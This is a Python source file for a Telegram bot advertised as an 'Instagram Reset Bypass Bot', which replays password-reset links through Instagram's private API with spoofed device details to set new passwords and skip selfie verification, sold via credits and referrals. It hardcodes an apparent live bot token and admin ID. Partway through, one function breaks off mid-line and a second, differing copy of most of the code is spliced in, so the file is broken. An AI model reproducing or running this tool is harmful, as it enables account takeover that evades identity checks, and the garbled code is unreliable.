import os
import random
import string
import uuid
import time
import json
from datetime import datetime, date
from threading import Thread
from functools import wraps
import requests

BOT_TOKEN = "8875833170:AAFAvGDa4JCYBEPYZS_BZCAtmjU67OfW62I"
CHAT_ID = "7735158151"
BOT_USERNAME = "IgReset_RoBot"  # Your bot's username without @

# Force subscribe channels (add your channel usernames without @)
FORCE_SUB_CHANNELS = ["xPythonTools", "Resphonic"]
ENABLE_FORCE_SUB = True  # Set to False to disable force subscribe

# Admin user IDs (Telegram numeric user IDs)
ADMIN_IDS = [7735158151, 987654321]

# Database file to store user credits and referrals
DB_FILE = "user_data.json"

# Optimize requests session for faster API calls
session = requests.Session()
session.headers.update({
    "Connection": "keep-alive",
    "Accept-Encoding": "gzip, deflate"
})

def load_db():
    try:
        with open(DB_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

def migrate_user_data():
    """Migrate old user data to include new fields"""
    db = load_db()
    updated = False
    
    for user_id, user_data in db.items():
        # Add missing fields
        if "referral_link" not in user_data:
            referral_code = user_data.get("referral_code", generate_referral_code())
            user_data["referral_link"] = f"https://t.me/{BOT_USERNAME}?start=ref_{referral_code}"
            updated = True
        
        if "total_referrals" not in user_data:
            user_data["total_referrals"] = 0
            updated = True
        
        if "total_earned" not in user_data:
            user_data["total_earned"] = user_data.get("credits", 0)
            updated = True
        
        if "referred_by" not in user_data:
            user_data["referred_by"] = None
            updated = True
    
    if updated:
        save_db(db)
        print("✅ Database migrated successfully!")

def get_user_data(user_id):
    db = load_db()
    user_id_str = str(user_id)
    
    if user_id_str not in db:
        referral_code = generate_referral_code()
        db[user_id_str] = {
            "credits": 2,
            "last_reset_date": str(date.today()),
            "referral_code": referral_code,
            "referral_link": f"https://t.me/{BOT_USERNAME}?start=ref_{referral_code}",
            "referred_by": None,
            "total_earned": 0,
            "total_referrals": 0
        }
        save_db(db)
    else:
        # Check for daily credit reset
        if db[user_id_str].get("last_reset_date") != str(date.today()):
            db[user_id_str]["credits"] = 2
            db[user_id_str]["last_reset_date"] = str(date.today())
            save_db(db)
        
        # Ensure all fields exist (for old users)
        if "referral_link" not in db[user_id_str]:
            referral_code = db[user_id_str].get("referral_code", generate_referral_code())
            db[user_id_str]["referral_link"] = f"https://t.me/{BOT_USERNAME}?start=ref_{referral_code}"
            save_db(db)
        
        if "total_referrals" not in db[user_id_str]:
            db[user_id_str]["total_referrals"] = 0
            save_db(db)
        
        if "total_earned" not in db[user_id_str]:
            db[user_id_str]["total_earned"] = db[user_id_str].get("credits", 0)
            save_db(db)
        
        if "referred_by" not in db[user_id_str]:
            db[user_id_str]["referred_by"] = None
            save_db(db)
    
    return db[user_id_str]

def update_user_credits(user_id, credits):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] = credits
        save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] += amount
        db[user_id_str]["total_earned"] = db[user_id_str].get("total_earned", 0) + amount
        save_db(db)
        return True
    return False

def deduct_credit(user_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] >= 1:
        user_data["credits"] -= 1
        update_user_credits(user_id, user_data["credits"])
        return True
    return False

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def verify_user_subscription(user_id):
    """Verify if user has joined all required channels"""
    if not ENABLE_FORCE_SUB:
        return True, None
    
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    
    return True, None

def edit_or_send(chat_id, text, message_id=None, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    """Edit existing message or send new one if no message_id"""
    if message_id:
        # Edit existing message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5)
            return response.json()
        except:
            return None
    else:
        # Send new message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5)
            return response.json()
        except:
            return None

def send_subscription_required(chat_id, user_id, message_id=None):
    """Send subscription required message with inline buttons"""
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    
    if not required_channels:
        return True
    
    channels_list = "\n".join([f"📢 <a href='https://t.me/{ch}'>{ch}</a>" for ch in required_channels])
    
    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>

Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴠᴇʀɪғʏ ⬇️"""

    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
    
    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғɪʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
    
    keyboard = {"inline_keyboard": keyboard_buttons}
    
    edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=False)
    return False

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=5)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=10)
        
        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=10).text
        
        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=10)
        new_password = PASSWORD.split(":")[-1]
        
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except:
        return None

def send_start_menu(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    credits = user_data["credits"]
    referral_code = user_data["referral_code"]
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>Wᴇʟᴄᴏᴍᴇ Tᴏ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss Bᴏᴛ</b>

📊 <b>Your Stats:</b>
• 💎 Cʀᴇᴅɪᴛs : <code>{credits}</code>《 2 Fʀᴇᴇ Pᴇʀ Dᴀʏ 》
• 👥 Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code> users
• 💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code> Pᴛs

Cʜᴏᴏsᴇ Aɴ Oᴘᴛɪᴏɴ Tᴏ Pʀᴏᴄᴇᴇᴅ ⬇️
"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "𓁿Rᴇsᴇᴛ Bʏᴘᴀss", "callback_data": "send_reset_link"}],
            [{"text": "👥 Rᴇғғᴇʀᴀʟ Iɴғᴏ", "callback_data": "referral_info"}, {"text": "📊 Mʏ Sᴛᴀᴛs", "callback_data": "profile"}],
            [{"text": "❓ Hᴇʟᴘ & Sᴜᴘᴘᴏʀᴛ", "callback_data": "help"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_instruction_for_link(chat_id, message_id=None):
    msg = """Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss 

Wɪᴛʜ Tʜɪs Fᴇᴀᴛᴜʀᴇ, Yᴏᴜ Cᴀɴ 
ʙʏᴘᴀss Sᴇʟғɪᴇ Bᴇʀɪғɪᴄᴀᴛɪᴏɴ Bʏ Sᴇɴᴅɪɴɢ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ.

Pʟᴇᴀsᴇ Sᴇɴᴅ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ ⬇️"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_referral_info(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>👥 Rᴇғғᴇʀᴀʟ Pʀᴏɢʀᴀᴍ</b>

<b>Yᴏᴜʀ Rᴇғғᴇʀᴀʟ Iɴᴠɪᴛᴇ Lɪɴᴋ:</b>

<code>{referral_link}</code>

<b>📊 Yᴏᴜʀ Sᴛᴀᴛs :</b>
• 👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code>
• 💎 Pᴛs Eᴀʀɴᴇᴅ : <code>{user_data.get('total_earned', 0)}</code>
• 💰 Cᴜʀʀᴇɴᴛ Pᴛs : <code>{user_data['credits']}</code>

<b>Hᴏᴡ Iᴛ Wᴏʀᴋs ❓:</b>
• Sʜᴀʀᴇ Yᴏᴜʀ Lɪɴᴋ Wɪᴛʜ Fʀɪᴇɴᴅs
• Wʜᴇɴ Tʜᴇʏ Jᴏɪɴ Usɪɴɢ Yᴏᴜʀ Lɪɴᴋ
• Yᴏᴜ Bᴏᴛʜ Gᴇᴛ <b>+2 Fʀᴇᴇ Pᴛs</b>!

<b>Sʜᴀʀᴇ Tʜɪs Lɪɴᴋ :</b>
Tᴀᴘ ᴀɴᴅ ʜᴏʟᴅ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ ᴛᴏ ᴄᴏᴘʏ, ᴏʀ ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ sʜᴀʀᴇ ᴅɪʀᴇᴄᴛʟʏ!"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "📤 Share Referral Link", "url": f"https://t.me/share/url?url={referral_link}&text=Join this Instagram Password Reset Bot!"}],
            [{"text": "📋 Copy Link", "callback_data": "copy_link"}],
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=True)

def send_profile(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"""<b>📊 Your Profile</b>

💎 Pᴛs : <code>{user_data['credits']}</code>
💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code>
👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{user_data.get('total_referrals', 0)}</code>
📅 Lᴀsᴛ Rᴇsᴇᴛ Oɴ : <code>{user_data.get('last_reset_date', str(date.today()))}</code>
👤 Rᴇғғᴇʀᴇᴅ Bʏ : <code>{user_data.get('referred_by') or 'None'}</code>"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_help(chat_id, message_id=None):
    msg = """<b>❓ Help & Commands</b>

<b>📌 How to get reset link:</b>
1. Go to Instagram login page
2. Click "Forgot password"
3. Enter username/email
4. Check your email for reset link
5. Copy FULL link and send here

<b>⚠️ Note:</b>
• Each reset costs 1 credit
• You get 2 free credits daily
• Failed resets are refunded

<b>💰 Get More Credits:</b>
Use referral system! Share your unique link with friends.

<b>Commands:</b>
/start - Main menu
/profile - Your stats
/refer - Referral info
/balance - Check credits
/cancel - Cancel current operation"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_balance(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    msg = f"💎 <b>Yᴏᴜʀ Rᴇᴍᴀɪɴɪɴɢ Pᴛs :</b> <code>{user_data['credits']}</code>\n\nUse /refer to get more credits!"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def process_reset_link_with_progress(chat_id, user_id, reset_link, message_id=None):
    """Process reset link with animated progress bar"""
    
    # Check credits first
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Pᴛs ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Pᴛs :</b>
• Sʜᴀʀᴇ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ《 2 Pᴛs ᴇᴀᴄʜ 》
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ《2 ғʀᴇᴇ ᴘᴇʀ ᴅᴀʏ 》

— Dᴍ @xYourKing Tᴏ Bᴜʏ Pᴛs

"""
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        edit_or_send(chat_id, msg, message_id, keyboard)
        return
    
    # Deduct credit
    deduct_credit(user_id)
    
    # Progress update function
    current_msg_id = message_id
    if not current_msg_id:
        # Send initial message if no message_id provided
        result = send_message(chat_id, "⚙️ <b>Pʀᴏᴄᴇssɪɴɢ ʏᴏᴜʀ ʟɪɴᴋ...</b>\n[0%] █▒▒▒▒▒▒▒▒▒")
        if result and "result" in result:
            current_msg_id = result["result"]["message_id"]
    
    def update_progress(percent, status_text):
        if current_msg_id:
            if percent >        if "referred_by" not in db[user_id_str]:
            db[user_id_str]["referred_by"] = None
            save_db(db)
    
    return db[user_id_str]

def update_user_credits(user_id, credits):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] = credits
        save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] += amount
        db[user_id_str]["total_earned"] = db[user_id_str].get("total_earned", 0) + amount
        save_db(db)
        return True
    return False

def deduct_credit(user_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] >= 1:
        user_data["credits"] -= 1
        update_user_credits(user_id, user_data["credits"])
        return True
    return False

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def verify_user_subscription(user_id):
    """Verify if user has joined all required channels"""
    if not ENABLE_FORCE_SUB:
        return True, None
    
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    
    return True, None

def edit_or_send(chat_id, text, message_id=None, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    """
    Edit existing message or send new one.
    Returns message_id on success, None on failure.
    Automatically falls back to sending a new message if editing fails.
    """
    if message_id:
        # Try to edit existing message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5).json()
            if response.get("ok"):
                return message_id  # same ID when editing
        except:
            pass  # fall through to send new message
    
    # Send new message
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": disable_web_page_preview
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5).json()
        if response.get("ok"):
            return response["result"]["message_id"]
    except:
        pass
    return None

def send_subscription_required(chat_id, user_id, message_id=None):
    """Send subscription required message with inline buttons"""
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    
    if not required_channels:
        return True
    
    channels_list = "\n".join([f"📢 <a href='https://t.me/{ch}'>{ch}</a>" for ch in required_channels])
    
    msg = f"""⚠️ <b>Join Channels To Use The Bot</b>

After Joining, Please Click Verify Below👇"""

    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Join Channel", "url": f"https://t.me/{ch}"}])
    
    keyboard_buttons.append([{"text": "✅ Verify Subscription", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_sub"}])
    
    keyboard = {"inline_keyboard": keyboard_buttons}
    
    return edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=False)

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=5)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=10)
        
        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=10).text
        
        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=10)
        new_password = PASSWORD.split(":")[-1]
        
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        if response.ok:
            return response.json()
    except:
        pass
    return None

def send_start_menu(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    credits = user_data["credits"]
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>Welcome To Instagram Reset Bot</b>

📊 <b>Your Stats:</b>
• 💺 Credits : <code>{credits}</code>〈 2 Free Per Day 〉
• 👥 Referrals : <code>{total_referrals}</code> users
• 💰 Total Pes : <code>{user_data.get('total_earned', 0)}</code> Pes

Choose An Option To Proceed ↓
"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔁Reset Bot", "callback_data": "send_reset_link"}],
            [{"text": "👥 Referral Info", "callback_data": "referral_info"}, {"text": "📊 My Stats", "callback_data": "profile"}],
            [{"text": "❓ Help & Support", "callback_data": "help"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_instruction_for_link(chat_id, message_id=None):
    msg = """Instagram Reset Bot 

With This Feature, You Can 
Successfully Reset Your Instagram Password By Sending Your Instagram Reset Link.

Please Send Your Instagram Reset Link ↓"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_referral_info(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>👥 Referral Program</b>

<b>Your Referral Invite Link:</b>

<code>{referral_link}</code>

